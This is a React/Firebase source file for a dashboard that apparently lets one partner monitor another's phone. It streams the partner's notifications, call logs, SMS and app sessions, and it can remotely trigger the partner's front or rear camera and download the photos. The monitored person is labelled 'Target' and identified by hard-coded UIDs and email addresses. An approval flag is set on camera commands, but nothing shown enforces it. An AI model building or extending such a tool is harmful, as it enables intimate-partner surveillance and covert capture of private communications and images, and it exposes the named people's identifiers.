import {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
  type ReactNode,
} from 'react';
import {
  collection,
  doc,
  getCountFromServer,
  limit,
  onSnapshot,
  orderBy,
  query,
  serverTimestamp,
  setDoc,
  where,
} from 'firebase/firestore';
import { useNavigate } from 'react-router-dom';
import {
  Activity,
  AlertCircle,
  Aperture,
  Bell,
  Camera,
  CheckCircle2,
  Download,
  Maximize2,
  Monitor,
  RefreshCw,
  Smartphone,
  X,
  ChevronLeft,
  ChevronRight,
  Plus,
} from 'lucide-react';
import { formatDistanceToNow, format } from 'date-fns';
import { db } from '../firebase';
import type { EventType, TrackerEvent, RemoteImage } from '../types';
import Header from '../components/Header';
import EventFilters from '../components/EventFilters';
import EventCard from '../components/EventCard';
import { useAuth } from '../context/AuthContext';

interface Filters {
  eventTypes: EventType[];
  appLabel: string | null;
  dateRange: 'today' | '7d' | '30d' | 'all';
  search: string;
}

interface StatItem {
  label: string;
  value: number;
  icon: ReactNode;
  gradient: string;
  accent: string;
}

const PARTNER_UIDS: Record<string, string> = {
  dicrDfK5OphttPlhKs5rBVUqNnC3: 'dVQspayOWZavC1j8FHqZk4ANX3u2',
  dVQspayOWZavC1j8FHqZk4ANX3u2: 'dicrDfK5OphttPlhKs5rBVUqNnC3',
};

function toMillis(value: unknown): number | null {
  if (typeof value === 'number') {
    return Number.isFinite(value) ? value : null;
  }
  if (typeof value === 'string') {
    const parsed = Date.parse(value);
    return Number.isNaN(parsed) ? null : parsed;
  }
  if (value instanceof Date) {
    return value.getTime();
  }
  if (value !== null && typeof value === 'object') {
    const timestamp = value as {
      toMillis?: () => number;
      seconds?: number;
    };
    if (typeof timestamp.toMillis === 'function') {
      try {
        const parsed = timestamp.toMillis();
        return Number.isFinite(parsed) ? parsed : null;
      } catch {
        return null;
      }
    }
    if (typeof timestamp.seconds === 'number') {
      return timestamp.seconds * 1000;
    }
  }
  return null;
}

function formatTimestamp(value: unknown): string {
  const millis = toMillis(value);
  if (millis === null) return 'Unknown date';
  return `${format(new Date(millis), 'MMM d, yyyy • h:mm a')}`;
}

/** Downloads base64 image as JPEG */
function downloadImage(img: RemoteImage) {
  const link = document.createElement('a');
  link.href = `data:image/jpeg;base64,${img.imageBase64}`;
  const dateStr = new Date(img.timestamp).toISOString().replace(/[:.]/g, '-');
  link.download = `photo-${img.lensFacing}-${dateStr}.jpg`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

export default function EventsPage() {
  const { user } = useAuth();
  const navigate = useNavigate();

  const isParth =
    user?.uid === 'dicrDfK5OphttPlhKs5rBVUqNnC3' ||
    user?.email?.toLowerCase() === 'parth@gmail.com';
  const isAmisha =
    user?.uid === 'dVQspayOWZavC1j8FHqZk4ANX3u2' ||
    user?.email?.toLowerCase() === 'amisha@gmail.com';

  const partnerUid = isParth
    ? 'dVQspayOWZavC1j8FHqZk4ANX3u2'
    : isAmisha
    ? 'dicrDfK5OphttPlhKs5rBVUqNnC3'
    : user
    ? PARTNER_UIDS[user.uid] ?? null
    : null;

  const partnerName = isParth ? 'Amisha' : isAmisha ? 'Parth' : 'Partner';
  const partnerEmail = isParth
    ? 'amisha@gmail.com'
    : isAmisha
    ? 'parth@gmail.com'
    : 'partner@example.com';

  const [events, setEvents] = useState<TrackerEvent[]>([]);
  const [loading, setLoading] = useState(true);
  const [initialLoad, setInitialLoad] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [eventsLimit, setEventsLimit] = useState(25);
  const [newEventCount, setNewEventCount] = useState(0);
  const [connectionStatus, setConnectionStatus] = useState<
    'connected' | 'connecting' | 'error'
  >('connecting');

  const [dbStats, setDbStats] = useState<{
    total: number | null;
    sessions: number | null;
    notifications: number | null;
    callsSms: number | null;
  }>({
    total: null,
    sessions: null,
    notifications: null,
    callsSms: null,
  });

  const [filters, setFilters] = useState<Filters>({
    eventTypes: [],
    appLabel: null,
    dateRange: 'all',
    search: '',
  });

  const [remoteImages, setRemoteImages] = useState<RemoteImage[]>([]);
  const [visiblePhotoCount, setVisiblePhotoCount] = useState(5);
  const [remoteLoading, setRemoteLoading] = useState(true);
  const [remoteError, setRemoteError] = useState<string | null>(null);
  const [requestingCamera, setRequestingCamera] = useState<
    'front' | 'back' | null
  >(null);
  const [cameraMessage, setCameraMessage] = useState<string | null>(null);
  const [cameraError, setCameraError] = useState<string | null>(null);

  const [activePhoto, setActivePhoto] = useState<RemoteImage | null>(null);

  const prevIdsRef = useRef<string[]>([]);
  const initialLoadRef = useRef(true);
  const newEventTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const loadMoreRef = useRef<HTMLDivElement>(null);
  const galleryRef = useRef<HTMLDivElement>(null);

  const handleFilterChange = useCallback((patch: Partial<Filters>) => {
    setFilters((prev) => ({ ...prev, ...patch }));
  }, []);

  // Escape key handler for modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') setActivePhoto(null);
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  const fetchDatabaseCounts = useCallback(async () => {
    if (!partnerUid) return;

    try {
      // 1. Total Activity Count (all events for this partner directly from DB)
      const totalQuery = query(
        collection(db, 'events'),
        where('syncedByUid', '==', partnerUid),
      );

      // 2. Notifications Count
      const notifsQuery = query(
        collection(db, 'events'),
        where('syncedByUid', '==', partnerUid),
        where('eventType', '==', 'NOTIFICATION_POSTED'),
      );

      // 3. Sessions Query
      const sessionsQuery = query(
        collection(db, 'events'),
        where('syncedByUid', '==', partnerUid),
        where('eventType', 'in', ['APP_SESSION_START', 'APP_SESSION_END']),
      );

      // 4. Calls & SMS Query
      const callsQuery = query(
        collection(db, 'events'),
        where('syncedByUid', '==', partnerUid),
        where('eventType', 'in', ['CALL_LOG', 'SMS_RECEIVED', 'SMS_SENT']),
      );

      const [totalRes, notifsRes, sessionsRes, callsRes] =
        await Promise.allSettled([
          getCountFromServer(totalQuery),
          getCountFromServer(notifsQuery),
          getCountFromServer(sessionsQuery),
          getCountFromServer(callsQuery),
        ]);

      const totalCount =
        totalRes.status === 'fulfilled' ? totalRes.value.data().count : null;
      const notifsCount =
        notifsRes.status === 'fulfilled' ? notifsRes.value.data().count : null;

      let sessionsCount: number | null =
        sessionsRes.status === 'fulfilled'
          ? sessionsRes.value.data().count
          : null;

      if (sessionsCount === null) {
        try {
          const [startSnap, endSnap] = await Promise.all([
            getCountFromServer(
              query(
                collection(db, 'events'),
                where('syncedByUid', '==', partnerUid),
                where('eventType', '==', 'APP_SESSION_START'),
              ),
            ),
            getCountFromServer(
              query(
                collection(db, 'events'),
                where('syncedByUid', '==', partnerUid),
                where('eventType', '==', 'APP_SESSION_END'),
              ),
            ),
          ]);
          sessionsCount = startSnap.data().count + endSnap.data().count;
        } catch {
          // ignore fallback error
        }
      }

      let callsCount: number | null =
        callsRes.status === 'fulfilled' ? callsRes.value.data().count : null;

      if (callsCount === null) {
        try {
          const [callSnap, smsInSnap, smsOutSnap] = await Promise.all([
            getCountFromServer(
              query(
                collection(db, 'events'),
                where('syncedByUid', '==', partnerUid),
                where('eventType', '==', 'CALL_LOG'),
              ),
            ),
            getCountFromServer(
              query(
                collection(db, 'events'),
                where('syncedByUid', '==', partnerUid),
                where('eventType', '==', 'SMS_RECEIVED'),
              ),
            ),
            getCountFromServer(
              query(
                collection(db, 'events'),
                where('syncedByUid', '==', partnerUid),
                where('eventType', '==', 'SMS_SENT'),
              ),
            ),
          ]);
          callsCount =
            callSnap.data().count +
            smsInSnap.data().count +
            smsOutSnap.data().count;
        } catch {
          // ignore fallback error
        }
      }

      setDbStats({
        total: totalCount,
        sessions: sessionsCount,
        notifications: notifsCount,
        callsSms: callsCount,
      });
    } catch (err) {
      console.error('Error fetching database counts:', err);
    }
  }, [partnerUid]);

  useEffect(() => {
    void fetchDatabaseCounts();
  }, [fetchDatabaseCounts]);

  // Events stream listener
  useEffect(() => {
    if (newEventTimeoutRef.current !== null) {
      clearTimeout(newEventTimeoutRef.current);
      newEventTimeoutRef.current = null;
    }

    if (!partnerUid) {
      setEvents([]);
      setLoading(false);
      setInitialLoad(false);
      setConnectionStatus('error');
      setError('Please sign in with an authorized partner account.');
      setNewEventCount(0);
      return;
    }

    initialLoadRef.current = true;
    prevIdsRef.current = [];
    setLoading(true);
    setInitialLoad(true);
    setConnectionStatus('connecting');
    setError(null);
    setNewEventCount(0);

    const eventsQuery = query(
      collection(db, 'events'),
      where('syncedByUid', '==', partnerUid),
      orderBy('observedAtUtc', 'desc'),
      limit(eventsLimit),
    );

    const unsubscribe = onSnapshot(
      eventsQuery,
      (snapshot) => {
        const rows = snapshot.docs.map(
          (docSnap) =>
            ({
              id: docSnap.id,
              ...docSnap.data(),
            } as TrackerEvent),
        );

        if (initialLoadRef.current) {
          initialLoadRef.current = false;
          prevIdsRef.current = rows.map((e) => e.id);
          setInitialLoad(false);
        } else {
          const priorIds = new Set(prevIdsRef.current);
          const currentIds = rows.map((e) => e.id);
          const added = currentIds.filter((id) => !priorIds.has(id));

          if (added.length > 0) {
            void fetchDatabaseCounts();
            setNewEventCount((c) => c + added.length);
            if (newEventTimeoutRef.current !== null) {
              clearTimeout(newEventTimeoutRef.current);
            }
            newEventTimeoutRef.current = setTimeout(() => {
              setNewEventCount(0);
              newEventTimeoutRef.current = null;
            }, 4000);
          }
          prevIdsRef.current = currentIds;
        }

        setEvents(rows);
        setLoading(false);
        setConnectionStatus('connected');
        setError(null);
      },
      (err) => {
        console.error('Events stream error:', err);
        setConnectionStatus('error');
        setLoading(false);
        setInitialLoad(false);
        setError(err.message || 'Error streaming partner events.');
      },
    );

    return () => {
      unsubscribe();
      if (newEventTimeoutRef.current !== null) {
        clearTimeout(newEventTimeoutRef.current);
        newEventTimeoutRef.current = null;
      }
    };
  }, [partnerUid, eventsLimit]);

  // Infinite Scroll Observer
  useEffect(() => {
    const node = loadMoreRef.current;
    if (!node || loading || events.length < eventsLimit) return;

    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          setEventsLimit((prev) => prev + 25);
        }
      },
      { rootMargin: '300px' },
    );

    observer.observe(node);
    return () => observer.disconnect();
  }, [loading, events.length, eventsLimit]);

  // Images stream listener
  useEffect(() => {
    if (!partnerUid) {
      setRemoteImages([]);
      setRemoteLoading(false);
      return;
    }

    setRemoteLoading(true);
    const imagesQuery = query(
      collection(db, 'remote_images'),
      where('deviceId', '==', partnerUid),
      orderBy('timestamp', 'desc'),
      limit(50),
    );

    const unsubscribe = onSnapshot(
      imagesQuery,
      (snapshot) => {
        const rows = snapshot.docs.map(
          (docSnap) =>
            ({
              id: docSnap.id,
              ...docSnap.data(),
            } as RemoteImage),
        );
        setRemoteImages(rows);
        setRemoteLoading(false);
        setRemoteError(null);
      },
      (err) => {
        console.error('Images error:', err);
        setRemoteLoading(false);
        setRemoteError('Could not load captured photos.');
      },
    );

    return () => unsubscribe();
  }, [partnerUid]);

  // Photo trigger request
  const triggerRemoteCamera = useCallback(
    async (lensFacing: 'front' | 'back') => {
      if (!partnerUid || !user?.uid) return;
      setRequestingCamera(lensFacing);
      setCameraMessage(null);
      setCameraError(null);

      try {
        const cmdRef = doc(collection(db, 'remote_commands'));
        await setDoc(cmdRef, {
          command: 'request_capture_photo',
          lensFacing,
          requestedBy: user.uid,
          requestedAt: serverTimestamp(),
          status: 'pending',
          deviceUid: partnerUid,
          requiresOwnerApproval: true,
        });

        setCameraMessage(
          `Request sent for ${lensFacing} camera. Capturing…`,
        );
      } catch (err: any) {
        setCameraError(err.message || 'Failed to dispatch capture command.');
      } finally {
        setRequestingCamera(null);
      }
    },
    [partnerUid, user?.uid],
  );

  // Memoized filter calculation for 60fps performance
  const filteredEvents = useMemo(() => {
    const { eventTypes, appLabel, dateRange, search } = filters;
    const searchTrimmed = search.trim().toLowerCase();
    const now = Date.now();
    let cutoff = 0;

    if (dateRange === 'today') {
      const today = new Date();
      today.setHours(0, 0, 0, 0);
      cutoff = today.getTime();
    } else if (dateRange === '7d') {
      cutoff = now - 7 * 86400000;
    } else if (dateRange === '30d') {
      cutoff = now - 30 * 86400000;
    }

    return events.filter((e) => {
      if (eventTypes.length > 0 && !eventTypes.includes(e.eventType)) {
        return false;
      }
      if (appLabel && e.appLabel !== appLabel) {
        return false;
      }
      if (cutoff > 0) {
        const t = toMillis(e.observedAtUtc);
        if (t === null || t < cutoff) return false;
      }
      if (searchTrimmed) {
        const haystack = `${e.title || ''} ${e.body || ''} ${e.appLabel || ''} ${e.packageName || ''}`.toLowerCase();
        if (!haystack.includes(searchTrimmed)) return false;
      }
      return true;
    });
  }, [events, filters]);

  // Memoized stats
  const stats: StatItem[] = useMemo(() => {
    let localSessions = 0;
    let localNotifs = 0;
    let localCallsSms = 0;

    for (const e of filteredEvents) {
      if (e.eventType === 'APP_SESSION_START' || e.eventType === 'APP_SESSION_END') {
        localSessions++;
      } else if (e.eventType === 'NOTIFICATION_POSTED') {
        localNotifs++;
      } else if (e.eventType === 'CALL_LOG' || e.eventType === 'SMS_RECEIVED' || e.eventType === 'SMS_SENT') {
        localCallsSms++;
      }
    }

    const hasActiveFilters =
      filters.eventTypes.length > 0 ||
      Boolean(filters.appLabel) ||
      filters.dateRange !== 'all' ||
      filters.search.trim() !== '';

    const totalVal = hasActiveFilters
      ? filteredEvents.length
      : dbStats.total ?? filteredEvents.length;

    const sessionsVal = hasActiveFilters
      ? localSessions
      : dbStats.sessions ?? localSessions;

    const notifsVal = hasActiveFilters
      ? localNotifs
      : dbStats.notifications ?? localNotifs;

    const callsVal = hasActiveFilters
      ? localCallsSms
      : dbStats.callsSms ?? localCallsSms;

    return [
      {
        label: 'Total Activity',
        value: totalVal,
        icon: <Activity className="w-4 h-4 text-emerald-400" />,
        gradient: 'from-emerald-500/10 to-transparent',
        accent: 'border-emerald-500/25',
      },
      {
        label: 'Sessions',
        value: sessionsVal,
        icon: <Monitor className="w-4 h-4 text-sky-400" />,
        gradient: 'from-sky-500/10 to-transparent',
        accent: 'border-sky-500/25',
      },
      {
        label: 'Notifications',
        value: notifsVal,
        icon: <Bell className="w-4 h-4 text-purple-400" />,
        gradient: 'from-purple-500/10 to-transparent',
        accent: 'border-purple-500/25',
      },
      {
        label: 'Calls & SMS',
        value: callsVal,
        icon: <Smartphone className="w-4 h-4 text-amber-400" />,
        gradient: 'from-amber-500/10 to-transparent',
        accent: 'border-amber-500/25',
      },
    ];
  }, [filteredEvents, dbStats, filters]);

  // Slide / Slice: latest 5 images by default, expandable by 5 on swipe/click
  const displayedImages = useMemo(() => {
    return remoteImages.slice(0, visiblePhotoCount);
  }, [remoteImages, visiblePhotoCount]);

  const hasMorePhotos = remoteImages.length > visiblePhotoCount;

  const handleLoadMorePhotos = () => {
    setVisiblePhotoCount((prev) => Math.min(prev + 5, remoteImages.length));
  };

  const scrollGallery = (direction: 'left' | 'right') => {
    if (galleryRef.current) {
      const amount = direction === 'left' ? -260 : 260;
      galleryRef.current.scrollBy({ left: amount, behavior: 'smooth' });
    }
  };

  const handleCardClick = useCallback((id: string) => {
    navigate(`/event/${id}`);
  }, [navigate]);

  return (
    <div className="min-h-screen flex flex-col bg-[#080C14] text-slate-100">
      <Header partnerName={partnerName} connectionStatus={connectionStatus} />

      {/* Floating toast */}
      {newEventCount > 0 && (
        <div className="fixed top-18 left-1/2 -translate-x-1/2 z-50 px-4 pointer-events-auto">
          <div className="flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-emerald-500 text-black font-semibold text-xs shadow-lg shadow-emerald-500/30">
            <span className="w-1.5 h-1.5 rounded-full bg-black animate-ping" />
            <span>{newEventCount} new event{newEventCount > 1 ? 's' : ''}</span>
          </div>
        </div>
      )}

      <main className="flex-1 pt-18 pb-14 px-3 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full">
        
        {/* Device Status Banner */}
        <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 mb-5 pb-4 border-b border-white/[0.06]">
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-white">
                {partnerName}'s Activity Feed
              </h1>
              <span className="px-2 py-0.5 rounded-full text-[11px] font-mono font-medium bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
                Live
              </span>
            </div>
            <p className="text-xs text-slate-400 font-mono mt-0.5 truncate">
              Target: {partnerEmail}
            </p>
          </div>

          <button
            onClick={() => {
              void fetchDatabaseCounts();
              setEventsLimit(25);
            }}
            className="btn-modern-secondary text-xs py-1.5 px-3 flex items-center gap-1.5 shrink-0 cursor-pointer"
          >
            <RefreshCw className="w-3.5 h-3.5 text-slate-400" />
            <span>Refresh</span>
          </button>
        </div>

        {/* Error message */}
        {error && (
          <div className="mb-4 p-3 rounded-xl bg-rose-500/10 border border-rose-500/25 text-rose-300 text-xs flex items-center gap-2">
            <AlertCircle className="w-4 h-4 text-rose-400 shrink-0" />
            <span>{error}</span>
          </div>
        )}

        {/* Stats Row */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-2.5 mb-5">
          {stats.map((s) => (
            <div
              key={s.label}
              className={`p-3 sm:p-4 rounded-2xl bg-gradient-to-br ${s.gradient} border ${s.accent} bg-[#0E1524] flex items-center justify-between`}
            >
              <div>
                <p className="text-[10px] sm:text-xs font-mono uppercase text-slate-400 font-semibold">
                  {s.label}
                </p>
                <p className="text-xl sm:text-2xl font-bold font-mono text-white mt-0.5">
                  {typeof s.value === 'number' ? s.value.toLocaleString() : s.value}
                </p>
              </div>
              <div className="p-2 rounded-xl bg-white/[0.05]">
                {s.icon}
              </div>
            </div>
          ))}
        </div>

        {/* Remote Camera Trigger */}
        <section className="p-4 sm:p-5 rounded-2xl bg-[#0E1524] border border-white/[0.08] mb-5">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div>
              <div className="flex items-center gap-2">
                <Camera className="w-4 h-4 text-cyan-400" />
                <h2 className="text-sm sm:text-base font-bold text-white">
                  Remote Camera Trigger
                </h2>
              </div>
              <p className="text-xs text-slate-400 mt-0.5">
                Take a remote selfie or rear-camera photo from {partnerName}'s phone.
              </p>
            </div>

            <div className="flex items-center gap-2 w-full sm:w-auto">
              <button
                type="button"
                onClick={() => void triggerRemoteCamera('front')}
                disabled={requestingCamera !== null || !partnerUid}
                className="btn-modern-primary flex-1 sm:flex-initial text-xs py-2 px-3 flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <Aperture className="w-3.5 h-3.5" />
                <span>Front Selfie</span>
                {requestingCamera === 'front' && (
                  <RefreshCw className="w-3 h-3 animate-spin" />
                )}
              </button>

              <button
                type="button"
                onClick={() => void triggerRemoteCamera('back')}
                disabled={requestingCamera !== null || !partnerUid}
                className="btn-modern-secondary flex-1 sm:flex-initial text-xs py-2 px-3 flex items-center justify-center gap-1.5 cursor-pointer"
              >
                <Camera className="w-3.5 h-3.5 text-slate-300" />
                <span>Rear Camera</span>
                {requestingCamera === 'back' && (
                  <RefreshCw className="w-3 h-3 animate-spin" />
                )}
              </button>
            </div>
          </div>

          {cameraMessage && (
            <div className="mt-3 p-2.5 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-xs text-emerald-300 flex items-center gap-2">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
              <span>{cameraMessage}</span>
            </div>
          )}
          {cameraError && (
            <div className="mt-3 p-2.5 rounded-xl bg-rose-500/10 border border-rose-500/20 text-xs text-rose-300 flex items-center gap-2">
              <AlertCircle className="w-3.5 h-3.5 text-rose-400 shrink-0" />
              <span>{cameraError}</span>
            </div>
          )}
        </section>

        {/* Captured Photos: Slide to Load More (Requested 5 items initial) */}
        <section className="p-4 sm:p-5 rounded-2xl bg-[#0E1524] border border-white/[0.08] mb-5">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <Aperture className="w-4 h-4 text-purple-400" />
              <h2 className="text-sm sm:text-base font-bold text-white flex items-center gap-1.5">
                <span>Latest Captured Photos</span>
                <span className="text-xs font-mono text-slate-400 font-normal">
                  ({displayedImages.length} of {remoteImages.length})
                </span>
              </h2>
            </div>

            <div className="flex items-center gap-2">
              {remoteLoading && (
                <span className="text-[11px] font-mono text-amber-400 flex items-center gap-1">
                  <RefreshCw className="w-3 h-3 animate-spin" />
                  Syncing…
                </span>
              )}

              {/* Slide Navigation Buttons */}
              {remoteImages.length > 0 && (
                <div className="flex items-center gap-1">
                  <button
                    onClick={() => scrollGallery('left')}
                    className="p-1 rounded-lg bg-white/[0.05] hover:bg-white/[0.1] text-slate-300 cursor-pointer"
                    aria-label="Previous slide"
                  >
                    <ChevronLeft className="w-4 h-4" />
                  </button>
                  <button
                    onClick={() => scrollGallery('right')}
                    className="p-1 rounded-lg bg-white/[0.05] hover:bg-white/[0.1] text-slate-300 cursor-pointer"
                    aria-label="Next slide"
                  >
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              )}
            </div>
          </div>

          {remoteError ? (
            <p className="text-xs text-rose-400 p-2.5 bg-rose-500/10 rounded-xl">{remoteError}</p>
          ) : remoteImages.length === 0 ? (
            <div className="py-8 text-center text-slate-400 text-xs bg-white/[0.02] rounded-xl border border-white/[0.04]">
              No photos captured yet. Request a selfie above.
            </div>
          ) : (
            <div className="relative">
              {/* Horizontal Swipeable Track */}
              <div
                ref={galleryRef}
                className="flex items-center gap-3 overflow-x-auto pb-2 scroll-smooth snap-x snap-mandatory"
                style={{
                  WebkitOverflowScrolling: 'touch',
                  scrollbarWidth: 'thin',
                }}
              >
                {displayedImages.map((img) => (
                  <div
                    key={img.id}
                    className="w-40 sm:w-48 shrink-0 snap-start rounded-2xl overflow-hidden bg-black border border-white/[0.08] group relative shadow-md"
                  >
                    <div className="aspect-square relative overflow-hidden">
                      <img
                        src={`data:image/jpeg;base64,${img.imageBase64}`}
                        alt="Remote Capture"
                        className="w-full h-full object-cover"
                        loading="lazy"
                        decoding="async"
                      />

                      {/* Top lens badge */}
                      <span className="absolute top-1.5 left-1.5 text-[9px] font-mono uppercase px-1.5 py-0.5 rounded-md bg-black/80 text-white font-semibold">
                        {img.lensFacing === 'front' ? 'Selfie' : 'Rear'}
                      </span>

                      {/* Action overlay */}
                      <div className="absolute inset-0 bg-black/60 opacity-0 group-hover:opacity-100 sm:transition-opacity flex items-center justify-center gap-2 p-2">
                        <button
                          type="button"
                          onClick={() => setActivePhoto(img)}
                          className="p-2 rounded-lg bg-white/20 text-white hover:bg-white/30 cursor-pointer"
                          title="View Fullscreen"
                        >
                          <Maximize2 className="w-3.5 h-3.5" />
                        </button>

                        <button
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            downloadImage(img);
                          }}
                          className="flex items-center gap-1 px-2 py-1.5 rounded-lg bg-emerald-500 text-black text-xs font-semibold cursor-pointer"
                          title="Download Image"
                        >
                          <Download className="w-3.5 h-3.5" />
                          <span className="hidden sm:inline">Save</span>
                        </button>
                      </div>

                      {/* Mobile Quick Download Button */}
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          downloadImage(img);
                        }}
                        className="sm:hidden absolute bottom-1.5 right-1.5 p-1.5 rounded-lg bg-emerald-500 text-black text-[10px] font-bold shadow-md cursor-pointer"
                        title="Download"
                      >
                        <Download className="w-3 h-3" />
                      </button>
                    </div>

                    <div className="p-2 bg-[#0E1524] text-[10px] text-slate-400 font-mono truncate">
                      {formatDistanceToNow(new Date(img.timestamp), { addSuffix: true })}
                    </div>
                  </div>
                ))}

                {/* Slide to Load More Tile */}
                {hasMorePhotos && (
                  <button
                    onClick={handleLoadMorePhotos}
                    className="w-36 sm:w-44 shrink-0 snap-start aspect-square rounded-2xl bg-white/[0.02] hover:bg-white/[0.06] border border-dashed border-white/[0.15] hover:border-emerald-500/40 flex flex-col items-center justify-center gap-1.5 p-3 text-center transition-all cursor-pointer group select-none"
                  >
                    <div className="w-9 h-9 rounded-full bg-emerald-500/10 border border-emerald-500/25 text-emerald-400 flex items-center justify-center group-hover:scale-110 transition-transform">
                      <Plus className="w-4 h-4" />
                    </div>
                    <span className="text-xs font-semibold text-white">Load 5 More</span>
                    <span className="text-[10px] font-mono text-slate-400">
                      {remoteImages.length - visiblePhotoCount} left
                    </span>
                    <span className="text-[9px] font-mono text-emerald-400/80">
                      ← Swipe to load
                    </span>
                  </button>
                )}
              </div>
            </div>
          )}
        </section>

        {/* Filter bar */}
        <EventFilters
          filters={filters}
          onChange={handleFilterChange}
          events={events}
        />

        {/* Events Feed Container */}
        {loading && initialLoad ? (
          <div className="space-y-2.5">
            {[1, 2, 3, 4].map((i) => (
              <div key={i} className="h-16 rounded-2xl bg-white/[0.03] animate-pulse" />
            ))}
          </div>
        ) : filteredEvents.length === 0 ? (
          <div className="p-10 text-center rounded-2xl bg-[#0E1524] border border-white/[0.06]">
            <Activity className="w-8 h-8 text-slate-500 mx-auto mb-2 opacity-50" />
            <p className="text-sm font-semibold text-white">No matching events</p>
            <p className="text-xs text-slate-400 mt-0.5">Try loosening your search or filters.</p>
          </div>
        ) : (
          <div className="space-y-2">
            {filteredEvents.map((event, index) => (
              <EventCard
                key={event.id}
                event={event}
                onClick={() => handleCardClick(event.id)}
                index={index}
              />
            ))}
          </div>
        )}

        {/* Infinite Scroll Anchor */}
        <div ref={loadMoreRef} className="mt-6 text-center py-3">
          {events.length >= eventsLimit && loading ? (
            <div className="inline-flex items-center gap-1.5 text-xs font-mono text-slate-400 px-3 py-1.5 rounded-full bg-white/[0.04]">
              <RefreshCw className="w-3 h-3 animate-spin text-emerald-400" />
              <span>Loading more…</span>
            </div>
          ) : events.length >= eventsLimit ? (
            <span className="text-xs font-mono text-slate-500">Scroll for more</span>
          ) : null}
        </div>

      </main>

      {/* Lightbox Photo Modal */}
      {activePhoto && (
        <div
          className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-3 sm:p-4"
          onClick={() => setActivePhoto(null)}
        >
          <div
            className="relative max-w-2xl w-full bg-[#0E1524] border border-white/[0.12] rounded-2xl overflow-hidden shadow-2xl flex flex-col max-h-[92vh]"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Modal Header */}
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/[0.08] bg-white/[0.02]">
              <div className="flex items-center gap-2">
                <span className="px-2 py-0.5 rounded-md text-xs font-mono font-semibold uppercase bg-emerald-500/20 text-emerald-300">
                  {activePhoto.lensFacing === 'front' ? 'Selfie' : 'Rear'}
                </span>
                <span className="text-xs text-slate-400 font-mono">
                  {formatTimestamp(activePhoto.timestamp)}
                </span>
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => downloadImage(activePhoto)}
                  className="btn-modern-primary text-xs py-1 px-2.5 flex items-center gap-1 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download</span>
                </button>

                <button
                  type="button"
                  onClick={() => setActivePhoto(null)}
                  className="p-1 rounded-lg text-slate-400 hover:text-white cursor-pointer"
                  aria-label="Close"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>
            </div>

            {/* Modal Body */}
            <div className="p-2 sm:p-4 flex items-center justify-center bg-black/60 overflow-hidden flex-1">
              <img
                src={`data:image/jpeg;base64,${activePhoto.imageBase64}`}
                alt="Captured Telemetry"
                className="max-h-[60vh] w-auto max-w-full rounded-xl object-contain"
                decoding="async"
              />
            </div>

            {/* Modal Footer */}
            <div className="px-4 py-2 border-t border-white/[0.08] bg-white/[0.02] flex items-center justify-between text-[11px] font-mono text-slate-400">
              <span className="truncate">UID: {activePhoto.deviceId}</span>
              <span>
                {formatDistanceToNow(new Date(activePhoto.timestamp), { addSuffix: true })}
              </span>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
